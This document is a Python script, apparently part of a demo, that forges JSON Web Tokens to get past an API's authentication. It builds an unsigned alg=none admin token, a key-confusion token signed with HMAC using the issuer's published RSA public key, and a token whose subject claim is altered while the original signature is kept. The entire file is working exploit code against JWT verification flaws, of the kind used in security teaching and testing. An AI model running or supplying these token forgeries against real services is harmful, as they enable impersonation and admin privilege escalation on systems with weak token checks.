"""Builds attacker tokens for curl_demo.sh. Usage: python forge.py none|confused|tamper JWKS_URL [TOKEN]

  none      alg=none token claiming role admin
  confused  HS256 token "signed" with the issuer's RSA public key (taken from the JWKS)
  tamper    takes TOKEN and changes its sub claim to "mallory", keeping the signature
"""
import base64
import hashlib
import hmac
import json
import sys
import time

import httpx
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm


def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64d(part):
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


mode, jwks_url = sys.argv[1], sys.argv[2]
issuer = jwks_url.split("/.well-known")[0]
claims = {"iss": issuer, "sub": "mallory", "aud": "orders-api", "role": "admin",
          "iat": int(time.time()), "exp": int(time.time()) + 300}
payload = b64e(json.dumps(claims).encode())

if mode == "none":
    print(f"{b64e(b'{\"alg\":\"none\",\"typ\":\"JWT\"}')}.{payload}.")
elif mode == "confused":
    rsa_jwk = next(k for k in httpx.get(jwks_url).json()["keys"] if k["kty"] == "RSA")
    pem = RSAAlgorithm.from_jwk(rsa_jwk).public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    header = b64e(json.dumps({"alg": "HS256", "kid": rsa_jwk["kid"], "typ": "JWT"}).encode())
    mac = hmac.new(pem, f"{header}.{payload}".encode(), hashlib.sha256).digest()
    print(f"{header}.{payload}.{b64e(mac)}")
elif mode == "tamper":
    h, p, s = sys.argv[3].split(".")
    original = json.loads(b64d(p))
    original["sub"] = "mallory"
    print(f"{h}.{b64e(json.dumps(original).encode())}.{s}")
